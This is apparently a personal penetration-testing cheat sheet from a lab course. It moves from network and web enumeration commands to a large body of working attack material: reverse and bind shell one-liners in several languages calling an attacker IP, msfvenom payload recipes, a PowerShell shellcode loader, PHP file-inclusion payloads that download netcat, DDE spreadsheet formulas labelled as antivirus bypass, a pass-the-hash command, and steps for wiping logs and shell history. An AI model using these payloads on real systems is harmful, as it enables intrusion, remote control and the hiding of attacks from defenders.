 # Discovery

 ## Tools
 	

## SQL Injection
```
' or '1' ='1' --
```
## Website Directory Enumeration


### Dirsearch
This is a great tool
```
sudo dirsearch -u http://$IP/books -E -R 3 -x 403,301,302 --header "User-Agent: Googlebot-Image" --plain-text-report=dirsearch_10.11.1.123_scan.txt
sudo dirsearch -u http://$IP/books -e php -R 3 -x 403,301,302 --plain-text-report=dirsearch_10.11.1.123_scan.txt

```
![image](https://gist.github.com/ssstonebraker/f25e2f1f6458da6dc074a1e7af79b773/raw/images---Thu_May_14_2020_1589483580178.png)
### Opendoor
This is a multithreaded python program to scan for files on web servers

#### How to use:
```bash
# python3 opendoor.py --host http://192.168.152.10 -p 9090  --scan=directories -t 50
```
#### Sample output:
```python
############################################################
#                                                          #
#   _____  ____  ____  _  _    ____   _____  _____  ____   #
#  (  _  )(  _ \( ___)( \( )  (  _ \ (  _  )(  _  )(  _ \  #
#   )(_)(  )___/ )__)  )  (    )(_) ) )(_)(  )(_)(  )   /  #
#  (_____)(__)  (____)(_)\_)  (____/ (_____)(_____)(_)\_)  #
#                                                          #
#  Directories: 36994		                           #
#  Subdomains: 181018		                           #
#  Browsers: 112			                   #
#  Proxies: 204			                           #
#  License: GNU General Public License                     #
############################################################
[08:33:03] warning: Threads has been reduced to 25 (max) instead of 50                                                                                                                                                                                                                                                  
[08:33:03] info:    Use --report param to store your scan results                                                                                                                                                                                                                                                       
[08:33:03] info:    Wait, please, checking connect to -> 192.168.152.10:9090 ...                                                                                                                                                                                                                                        
[08:33:03] info:    Server 192.168.152.10:9090 (192.168.152.10) is online!                                                                                                                                                                                                                                              
[08:33:03] info:    Scanning 192.168.152.10 ...                                                                                                                                                                                                                                                                         
[08:33:03] info:    0.1% [00028/36994] - 0B - Denied http://192.168.152.10:9090/..;/                                                                                                                                                                                                                                    
[08:33:08] info:    3.2% [01173/36994] - 0B - http://192.168.152.10:9090/325/                                                                                                                                                                                                                                           [08:33:08] warning: skip [00000/36994] - Ignored /404.php                                                                                                                                                                                                                                                               
[08:33:20] info:    11.4% [04205/36994] - 0B - Denied http://192.168.152.10:9090/a%5c.asp                                                                                                                                                                                                                               
[08:33:20] info:    11.4% [04208/36994] - 0B - Denied http://192.168.152.10:9090/a%5c.php                                                                                                                                                                                                                               
[08:33:20] info:    11.4% [04208/36994] - 0B - Denied http://192.168.152.10:9090/a%5c.aspx                                                                                                                                                                                                                              
[08:34:03] info:    40.7% [15043/36994] - 306B - http://192.168.152.10:9090/erika/                                                                                                                                                                                                                                      [08:34:03] warning: skip [00000/36994] - Ignored /error.php                                                                                                                                                                                                                                                             
[08:34:05] info:    42.4% [15674/36994] - 946B - OK http://192.168.152.10:9090/favicon.ico                                                                                                                                                                                                                              
[08:34:17] info:    51.7% [19114/36994] - 0B - http://192.168.152.10:9090/include.inc                                                                                                                                                                                                                                   [08:34:17] warning: skip [00000/36994] - Ignored /index.php                                                                                                                                                                                                                                                             
[08:34:17] info:    51.8% [19148/36994] - 1KB - OK http://192.168.152.10:9090/index.html                                                                                                                                                                                                                                
[08:34:26] info:    58.3% [21578/36994] - 1KB - OK http://192.168.152.10:9090/login/                                                                                                                                                                                                                                    
[08:34:48] info:    74.1% [27404/36994] - 2KB - OK http://192.168.152.10:9090/products/                                                                                                                                                                                                                                 
[08:34:57] info:    80.3% [29693/36994] - 3KB - OK http://192.168.152.10:9090/search/                                                                                                                                                                                                                                   
[08:35:27] info:    100.0% [36991/36994] - 0B - http://192.168.152.10:9090/~tmp/                                                                                                                                                                                                                                        +-------------------------------+-----------+
| Statistics (192.168.152.10)   |   Summary |
|-------------------------------+-----------|
| failed                        |     36982 |
| bad                           |         4 |
| ignored                       |         3 |
| success                       |         5 |
| items                         |     36994 |
| workers                       |        25 |
+-------------------------------+-----------+
[08:35:27] debug:   Total time running: 0:02:23.799132      
```



## Network File Sharing (NFS)

### Find servers running NFS
```
# nmap -sT -p111,1039,1047,1048,2049 -A 10.11.1.1-254 -oG lab_nfs_servers.txt

# egrep 'filtered|open' lab_nfs_servers.txt | awk '{ print $2 }' > lab_nfs_ips.txt
```

### Scan NFS servers for vulnerabilities
```
# nmap -p 111 --script nfs* -iL lab_nfs_ips.txt
```

## Google dorks: 
        https://www.exploit-db.com/google-hacking-database/
		site:"megacorpone.com" -site:"www.megacorpone.com" filetype:ppt "penetration"
		intitle:"VNC viewer for Java"
		inurl:"robots.txt"
		intitle:"-N3t" filetype:php undetectable	-Sites compromised with backdoor
## DNS - Email 
		host -t ns megacorpone.com
		host -t mx megacorpone.com
		host -l megacorpone.com ns1.megacorpone.com	-Check for zone transfer
			 nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
		dnsenum
		theharvester -d cisco.com -b google >google.txt		-Email harvest from google.com
## Crackmap Exec cme
This will return all windows hosts running smb and their window version + their domain (very quickly)
```
cme smb 10.11.1.0/24
```
## Nmap

### Subnet scan with exlusion
	nmap 10.1.1.0/24 --exclude 10.1.1.34 10.1.1.45

	# use good and avoid files
	echo 10.1.1.34 10.1.1.45 > avoid.txt
	echo 10.1.1.0/24 > good.txt
	nmap -iL good.txt --excludefile avoid.txt

### Subnet scan	
	nmap -Pn --top-ports 20 192.168.186.0/24 --open -T4
	nmap -sn 192.168.1.0/24 -oG ping-sweep-nmap.txt
	grep Up ping-sweep.txt | cut -d " " -f 2

### Web Sweep port 80
```
nmap -p 80 192.168.1.0/24 -oG ping-sweep-nmap.txt
grep open web-sweep.txt |cut -d" " -f2
```
### Scan via Proxy Chains
#### Setup proxy chains
We will host a socks4 proxy on 127.0.0.1:8080 and ssh to a machine with access to the 172.16.152.0/24 network

```
# Edit /etc/proxychains.conf and add the following after [ProxyList]
[kali@kali:~]$ grep socks4 /etc/proxychains.conf  | grep -v "^#"
socks4 	127.0.0.1 8080

# ssh to the Debian machine using the -D argument specifying the dynamic connection and list socket 127.0.0.1:8080 as the proxy
[kali@kali:~]$ sudo ssh -N -D 127.0.0.1:8080 student@192.168.152.44

```

#### Initiate Scan
You must prepend your commmand with proxychains.  Be sure you don't sue the nmap "-sS" (TCP SYN scan)
```
[kali@kali:~]$ proxychains nmap --top-ports=20 -sT -Pn 172.16.152.5
```
## nmap

### Scan Top 20 ports
```
nmap -sT -A --top-ports 20 192.168.1.0/24 --open -oG top-port.txt
```
		nmap -v -p 80 --script all 192.168.1.1
### Export to XML, Scan All Ports

	$ sudo nmap 192.168.152.44 -p- -sV -vv --open --reason -oX 192.168.152.44.xml

### Scan all ports with default set of scripts and SYNC for faster run time
```
nmap -sC -sS -p0-65535 sandbox.local --open -oG sandboxlocal.grep -oX sandboxlocal.xml
```

## SMB (tcp 139, 445) enum:
			//192.168.186.147 (commands - list, dir,  mget * )
		rpcclient -U "" 192.168.1.1
		smbclient -U testuser //localhost/report-upload/
		smbclient -N -L \\\\10.11.1.31
			no password, hit <Enter>
			if logged try srvinfo
		enum4linux -v 192.168.152.109
		nmap -p 139,445 --script smb-enum-users 192.168.1.0/24
		nmap -p 135,139,445 --script smb-enum-shares 192.168.1.0/24
		nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.201
		nmap -p 135,139,445 --script smb-*  --script-args=unsafe=1 -oX 


		/root/mega/exploits/samba28 (made of 10.c) use exploit/linux/samba/trans2open (Unix Samba 2.2.0 to 2.2.8)
			./samba28 -b 0 -v 10.11.1.28
		use exploit/multi/samba/usermap_script (Samba 3.0.20 - 3.0.25)
		use exploit/linux/samba/lsa_transnames_heap	-Linux 3.0.21-3.0.24
		EthernalBlue (zzz_ezploit.py creating user cplsec P@ssw0rd123! on the target)

## SMTP (tcp 25) enum:

        nmap --script smtp-enum-users.nse -p 25,465,587 10.11.1.1-254 -oA .
		Nmap scan report for 10.11.1.227
		Host is up (0.049s latency).

		PORT    STATE  SERVICE
		25/tcp  open   smtp
		| smtp-enum-users: 
		|   root
		|   admin
		|   administrator
		|   webadmin
		|   sysadmin
		|   netadmin
		|   guest
		|   user
		|   web
		|_  test



		nc -nv 192.168.1.2 25
		HELO a
		EXPN root	-Enumeration
		VRFY user	-Enumeration
	Writing mail:
		MAIL FROM:root
		RCPT TO:root
		DATA Hello there
		.
	Enum automation:
		for user in$(cat users.txt); do echo VRFY $user |nc -nv 192.168.1.2 25 2>/dev/null |grep ^"250"	-Does not always work
		use smtp-user-enum script from pentestmonkey

## SNMP 
	SNMP (udp 161):
		onesixtyone -c community_strings.txt -i listIP.txt
		onesixtyone -c snmp_strings.txt -i hosts.txt | cut -d " " -f 1 >> snmp_hosts.txt
### snmp-check
I prefer to use snmp-check becuase it gives you a full useful report
```
# for ip in $(cat ips.txt); do snmp-check $ip; done
```

### snmpwalk
snmpwalk is good to enumerate individual MIBs

#### Enumerate MIB Tree
```
snmpwalk -c public -v1 -t 10 10.11.1.14
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPAT IBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)" iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (2005539644) 232 days, 2:56:36.44 iso.3.6.1.2.1.1.4.0 = ""
```

#### Enumerate Windows Users
```
$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.3.98.111.98 = STRING: "bob"
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.8.73.85.83.82.95.66.79.66 = STRING: "IUSR_BOB"
```

#### Enumerate Running Windows Processes
```
$ snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "System Idle Process"
iso.3.6.1.2.1.25.4.2.1.2.4 = STRING: "System"
iso.3.6.1.2.1.25.4.2.1.2.224 = STRING: "smss.exe"
iso.3.6.1.2.1.25.4.2.1.2.324 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.364 = STRING: "wininit.exe"
```

#### Enumerate Open TCP Ports
```
$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.21.0.0.0.0.18646 = INTEGER: 21
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.80.0.0.0.0.45310 = INTEGER: 80
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.135.0.0.0.0.24806 = INTEGER: 135
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.443.0.0.0.0.45070 = INTEGER: 443
```

#### Enumerate Installed Software
```
$ snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
iso.3.6.1.2.1.25.6.3.1.2.1 = STRING: "LiveUpdate 3.3 (Symantec Corporation)" iso.3.6.1.2.1.25.6.3.1.2.2 = STRING: "WampServer 2.5"
iso.3.6.1.2.1.25.6.3.1.2.3 = STRING: "VMware Tools"
iso.3.6.1.2.1.25.6.3.1.2.4 = STRING: "Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148"
iso.3.6.1.2.1.25.6.3.1.2.5 = STRING: "Microsoft Visual C++ 2012 Redistributable (x86) - 11.0.61030"
```
#### Looping snmpwalk
```
# users
code="1.3.6.1.4.1.77.1.2.25"
for host in $(cat  ips.txt); do echo -e "---------\nhost:$host\n-----------";snmpwalk -c public -v1 $host $code; done

# software Name
code="1.3.6.1.2.1.25.6.3.1.2"
for host in $(cat  ips.txt); do echo -e "---------\nhost:$host\n-----------";snmpwalk -c public -v1 $host $code; done
#

```
##### List of codes
```
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```

## VNC

	VNC:
		vncviewer 192.168.1.116::5901
		hydra -p "password" vnc://192.168.1.117:5901
		hydra -P /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt -s 5901 192.168.1.116 vnc


## Universal shell (change IP to yours):
    while true;do bash -i >& /dev/tcp/IP/1337 0>&1;nc -e /bin/sh IP 1337;perl -e 'use Socket;$i="IP";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';php -r '$sock=fsockopen("IP",1337);exec("/bin/sh -i <&3 >&3 2>&3");';ruby -rsocket -e'f=TCPSocket.open("IP",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)';sleep 5;done

## Priv escalation
### Reverse shell
		bash -i >& /dev/tcp/10.1.1.246/443 0>&1
		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.114.137 443 >/tmp/f
	Add SSH keys: ssh-keygen -t rsa -b 2048
	root.c:
	#include <stdlib.h>
	#include <unistd.h>

	int main() {
		setuid(0);
		setgid(0);
	system("/bin/bash");
	}

#### bash
    bash -i >& /dev/tcp/192.168.100.113/4444 0>&1

#### sh
    rm -f /tmp/p; mknod /tmp/p p && nc <attacker-ip> 4444 0/tmp/p

#### telnet
    rm -f /tmp/p; mknod /tmp/p p && telnet <attacker-ip> 80 0/tmp/p

#### python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#### perl 
    perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#### Upgrade reverse shell non-interactive to interactive
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Sevices examination:

	

## Public exploits
	Linux:
		wget -O exploit.c https://www.exploit-db.com/exploits/18411	-CVE 2012-0056 root for >=2.6.39 (Ubuntu 11.10, kernel 3.0.0-12)
		gcc exploit.c -o exploit	-Compile to binary
	Get Win compiler:
		sudo apt-get install mingw-w64
		i686-w64-mingw32-gcc slmail-win-fixed.c -lws2_32 -o s.exe	-For x86
		x86_64-w64-mingw32-gcc -o main64.exe main.c	-For x64

		i585-mingw32msvc-gcc file_name.c -lws2_32 -o exploit.exe
		wine exploit.exe	-To run Windows file in Linux
	Windows:
		wget -O ms11-080.py https://www.exploit-db.com/exploits/18176	-MS11-080 (WinXP and 2003)
		python pyinstaller.py --onefile ms11-080.py			-Create an exe out of python

    xfreerdp /u:administrator /d:thinc /pth:aad3b435b51404eeaad3b435b51404ee:0598acedc0122622ad85afc9e66d329e /v:10.11.1.221

## History Removal
	Find and remove ossec-alerts.log, access.log, httpd-access.log
	echo > .bash_history

## AV bypass

	DDE inj in xlsx
    =cmd|'/c powershell.exe -w hidden $e=(Copy-Item -Path c:\Te\12345.txt -Destination C:\Users\test\12345); powershell -e $e'!A1
	=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\"http://1.2.3.4/test.exe\"); powershell -e $e'!A1

	HTTP2 https://www.youtube.com/watch?v=YHOnxlQ6zec

	In wireshark: http2.data.data && http2 contains username
	nghttp -v -u http://http2.sec642.org/../../../../etc/passwd doesn't work, need to be encoded
	curl2 --http2 http://http2.sec642.org/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
	curl --http2-prior-knowledge --data "status=on" http://localhost:8080/index.ph

## ADFS:

```$msolcred = get-credential
connect-msolservice -credential $msolcred
Get-MsolUser -All | ft -AutoSize
```

## Netcat Shells

### Interact with a service

#### Pop Mail
```
Kali                    nc -nv 192.168.152.10 110
```
#### Chat
```
Kali                    nc -nv 192.168.152.10 4444
Windows                 nc.exe -nlvp 4444
```

### File Transfer
```
Kali                    nc -nv 192.168.152.10 4444 < /usr/share/windows-binaries/wget.exe
Windows                 nc.exe -nlvp 4444 > wget.exe
There is no output letting you know when the transfer is complete
```

### Bind shell - Windows
Windows *listens on port 4444, runs cmd.exe*

```
Windows                 nc.exe -nlvp 4444 -e cmd.exe
Kali                    nc -nv 192.168.152.10 4444                        
```

### Reverse shell

#### Windows msfvenom exe reverse
```
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.152 LPORT=40000 -f exe > tpc_rev_40000.exe
```
#### Powershell Reverse Shell One Liner

##### Windows Host
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.152",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.152:40000/Invoke-PowerShellTcp.ps1')"
```
##### Kali Host
```
sudo nc -nlvp 4242
```

#### nc on windows
```
Windows                 nc.exe -nlvp 4444
Kali                    nc -nv 192.168.152.10 4444 -e /bin/bash
Windows                 You will not see a Linux prompt
```

### PHP Wrappers

#### certutil to download netcat
*Note: we are hosting netcat on the source system (192.168.119.152) at nc.exe.txt*

    http://192.168.152.10/menu.php?file=data:text/plain,<?php echo shell_exec("certutil -urlcache -split -f http://192.168.119.152/nc.exe.txt c:\windows\system32\nc.exe") ?>

#### Run bind shell with netcat

    http://192.168.152.10/menu.php?file=data:text/plain,<?php echo shell_exec("nc.exe -nlvp 4444 -e cmd.exe") ?>

	# connect to the bind shell from attacker machine
	# nc -nv 192.168.152.10 4444

### PHP - Other Examples
```
<?php shell_exec("bash -i >& /dev/tcp/10.11.0.61/5555 0>&1") ?>

<?php shell_exec("nc -e /bin/sh 10.11.0.61 5555") ?>
<?php shell_exec("nc -e /bin/sh 10.11.0.61 5555") ?>

<?php $sock=fsockopen("10.11.0.61",5555);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

# Assembly
Good info on windows assembly and exploits:
https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit

# Exploits
https://github.com/Screetsec/TheFatRat

## VBscript Remote Code Execution
https://github.com/Yt1g3r/CVE-2018-8174_EXP

# Creating Metasploit Payloads

	List payloads
	msfvenom -l

## Binaries

	Linux
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

	Windows
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

	Mac
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho


## Web Payloads

### msfvenom

	PHP
	msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
	cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

	ASP
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.152 LPORT=4444 -f asp > shell.asp

	JSP
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

	WAR
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

### Shellpop

#### Linux PHP

Use shellpop to create a reverse shell with a python stager

    # shellpop --payload linux/reverse/tcp/php --host tun0 --port 4444 --handler --base64 --stager http

Copy the generated code into our exploit

    payload = "<?php echo shell_exec('echo cHl0aG9uIC1jICJmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQ7aW1wb3J0IG9zO29zLnN5c3RlbShnZXQoJ2h0dHA6Ly8xOTIuMTY4LjExOS4xNTI6ODAvRHJkclhhaFknKS50ZXh0KSIg|base64 -d|/bin/bash') ?>"

Listen locally on port 4444:	

    # nc -nlvp 4444

Run the exploit to invoke the payload and have the target connect back to you on port 4444

If you uploaded the payload, call it with curl or alternative

## Scripting Payloads

### Windows Reverse Shell

#### Generating the Payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.152 LPORT=4444 -f powershell
```

#### Full powershell script
```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]]$sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x68,0xc0,0xa8,0x77,0x98,0x68,0x2,0x0,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75,0xec,0xe8,0x67,0x0,0x0,0x0,0x6a,0x0,0x6a,0x4,0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0,0x56,0x53,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0,0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc,0x24,0xf,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x1,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

#### Setting up Meterpreter
One command at a time:
```
service postgresql start
sudo msfdb init
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
exploit
```
##### Windows reverse tcp exe 40000
```
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.152 LPORT=40000 -f exe > tpc_rev_40000.exe

msfconsole -x "use exploit/multi/handler; set RHOST 10.11.1.21; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.152; set LPORT 40000; set AutoRunScript post/windows/manage/migrate; exploit"
```

##### Widows reverse tcp 443
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.152 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

msfconsole -x "use exploit/multi/handler; set RHOST 10.11.1.222; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.152; set LPORT 443; set AutoRunScript post/windows/manage/migrate; exploit"
```

##### JSP reverse tcp 443
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.152 LPORT=443 -f raw > shell.jsp
	
msfconsole -x "use exploit/multi/handler; set RHOST 10.11.1.222; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 192.168.119.152; set LPORT 443; exploit"

```
##### All at once - Reverse TCP
set RHOST to the IP of the host you are attacking
```
msfconsole -x "use exploit/multi/handler; set RHOST 10.11.1.14; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.152; set AutoRunScript post/windows/manage/migrate; exploit"

msfconsole -x "use exploit/multi/handler; set RHOST 10.11.1.13; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.152; set LPORT 443; set AutoRunScript post/windows/manage/migrate; exploit"

```

##### All at once - Reverse HTTPS
```
msfconsole -x "use exploit/multi/handler; set RHOST 10.11.1.13; set PAYLOAD windows/meterpreter/reverse_https;  set LHOST tun0; set LPORT 8443; set AutoRunScript post/windows/manage/migrate; exploit"

```
#### Auto Migrate Process
Before you run exploit run this
```
set AutoRunScript post/windows/manage/migrate
```
### Windows Bind Shell

#### Using C to create a bind shell on Windows

##### File winshell.c
This file will:
1. Using the native "certuil.exe", download nc.exe.txt from the kali box and save it as C:\windows\system32\nc.exe
2. Create a listening socket on TCP 4444 (Windows Machine)
```
#include <stdlib.h>
#include <windows.h>
int main ()
{

        int i;

        i = system ("certutil -urlcache -split -f http://192.168.119.152/nc.exe.txt c:\\windows\\system32\\nc.exe");
        Sleep(10000); // 10 seconds (10000 milliseconds)
        i = system ("nc.exe -nlvp 4444 -e cmd.exe");

                return 0;
}
```
##### Compile winshell.c
```
sudo i686-w64-mingw32-gcc winshell.c -o winshell.exe
```
##### Connect Windows shell from attacker box
```
nc -nv 192.168.152.10 4444
```

#### Generating the Payload
```
msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp LPORT=4444 EXITFUNC=thread -e x86/xor_dynamic -b "\x00\x09\x0a\x1a\x10" -f python
msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp LPORT=4445 -e x86/shikata_ga_nai -b "\x00\x09\x0a\x1a\x10" -f python
```

#### Connect to Bind Shell from multi handler

##### Create exploit to run on windows box (creating bind shell)
Replace Lhost with the windows box you are attacking
```
msfvenom -p windows/meterpreter/bind_tcp LHOST=10.11.1.14 LPORT=40000 -f exe > bind.exe
```


##### Connect to the bind shell - Automatic
Replace RHOST with the IP of the windows host you are attacking
```
msfconsole -x "use exploit/multi/handler; set RHOST 10.11.1.14; set PAYLOAD windows/meterpreter/bind_tcp; set rhost 10.11.1.14; set lport 40000; exploit"
```

##### Connect to the bind shell - Manual
```
sudo service postgresql start
sudo msfdb init
msfconsole

msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf5 exploit(multi/handler) > set rhost 192.168.152.10
rhost => 192.168.152.10
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 192.168.152.10:4444
[*] Sending stage (180291 bytes) to 192.168.152.10
[*] Meterpreter session 1 opened (192.168.119.152:33035 -> 192.168.152.10:4444) at 2020-04-06 02:55:29 -0400
```



	Python
	msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

	Bash
	msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

	Perl
